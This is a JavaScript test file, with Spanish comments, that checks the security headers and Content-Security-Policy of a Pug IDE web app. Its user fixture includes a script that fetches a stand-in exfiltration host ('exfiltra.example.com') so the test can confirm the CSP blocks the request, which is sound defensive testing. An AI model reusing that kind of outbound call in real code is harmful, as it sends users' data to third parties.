import { check, openApp, previewFrame, previewText, waitUntil } from '../lib.mjs';

// Cabeceras de seguridad (vercel.json, que el servidor de pruebas aplica tal cual) y Content-Security-Policy:
// la app y el preview, con recursos remotos y scripts del usuario, no deben provocar ninguna violación,
// y la política debe bloquear lo que prometemos bloquear (red desde el JavaScript del usuario).
const session = {
  projectName: 'CSP',
  files: {
    '/main.pug': `doctype html
html
  head
    style.
      @font-face { font-family: Remota; src: url(https://fonts.example.com/remota.woff2) format("woff2"); }
      body { font-family: Remota, sans-serif; background: url(https://img.example.com/fondo.png); }
  body
    h1 Titulo CSP
    img#remota(src="https://img.example.com/foto.png" alt="remota")
    img#datos(src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="data")
    p#red sin ejecutar
    script.
      fetch('https://exfiltra.example.com/?x=1').then(function () { document.getElementById('red').textContent = 'red:permitida'; })
        .catch(function () { document.getElementById('red').textContent = 'red:bloqueada'; });
`,
  },
  openTabPaths: ['/main.pug'],
  activeTabPath: '/main.pug',
};

export default async function (env) {
  // Cabeceras tal como las sirve el hosting
  for (const path of ['/', '/ide', '/index.html', '/assets/preview-host.html', '/ngsw-worker.js', '/manifest.webmanifest']) {
    const res = await fetch(env.baseURL + path);
    const csp = res.headers.get('content-security-policy') ?? '';
    const dir = (name) => csp.split(';').map((d) => d.trim()).find((d) => d.startsWith(name + ' ')) ?? '';
    check(`18 ${path}: CSP con object-src none y frame-ancestors none`,
      dir('object-src') === "object-src 'none'" && dir('frame-ancestors') === "frame-ancestors 'none'", csp);
    check(`18 ${path}: la CSP permite imágenes y fuentes remotas, workers blob: y no abre la red a terceros`,
      /img-src[^;]*https:/.test(csp) && /font-src[^;]*https:/.test(csp) && /worker-src[^;]*blob:/.test(csp) && dir('connect-src') === "connect-src 'self' blob: data:", csp);
    check(`18 ${path}: nosniff, DENY, Referrer-Policy, Permissions-Policy y HSTS`,
      res.headers.get('x-content-type-options') === 'nosniff' && res.headers.get('x-frame-options') === 'DENY'
      && !!res.headers.get('referrer-policy') && /camera=\(\)/.test(res.headers.get('permissions-policy') ?? '')
      && /max-age=\d+/.test(res.headers.get('strict-transport-security') ?? ''));
  }
  check('18 el service worker conserva su Cache-Control junto a las cabeceras de seguridad',
    (await fetch(env.baseURL + '/ngsw-worker.js')).headers.get('cache-control')?.includes('must-revalidate') === true);
  check('18 el manifest conserva su Content-Type', (await fetch(env.baseURL + '/manifest.webmanifest')).headers.get('content-type') === 'application/manifest+json');

  // La CSP de la app la heredan el preview y el render (srcdoc): con recursos remotos y scripts del usuario, 0 violaciones
  // salvo la deliberada de abajo (el fetch a un tercero).
  // Firefox y WebKit no vuelcan las violaciones a la consola con el mismo texto: ahí solo se exige que no haya otras.
  // Nota: el preview reescribe su documento con document.open(), que borra los listeners; las violaciones llegan por el texto de la consola.
  const app = await openApp(env, { path: '/ide', session });
  const { page } = app;
  await waitUntil(async () => (await previewText(page)).includes('Titulo CSP'));
  const frame = await previewFrame(page);
  const red = await waitUntil(async () => frame && (await frame.evaluate(() => document.getElementById('red')?.textContent).catch(() => null)) !== 'sin ejecutar'
    ? frame.evaluate(() => document.getElementById('red').textContent).catch(() => null) : null);
  check('18 el script del usuario corre en el preview, pero la CSP bloquea sus peticiones a terceros', red === 'red:bloqueada', String(red));
  check('18 la única violación es la del fetch deliberado a un tercero (connect-src)',
    ((process.env.PUGIDE_BROWSER || 'chromium') !== 'chromium' || app.violations.some((v) => /connect-src/.test(v))) && app.violations.every((v) => v.includes('exfiltra.example.com')), JSON.stringify(app.violations));
  check('18 el preview con imagen/fuente remota y data: se pinta (el único bloqueo es el de red)', (await previewText(page)).includes('Titulo CSP'));
  check('18 las imágenes remotas se intentan cargar (img-src https:) sin violación', app.external.some((u) => u.includes('img.example.com/foto.png')), JSON.stringify(app.external));
  await app.close({ expectViolations: true });
}
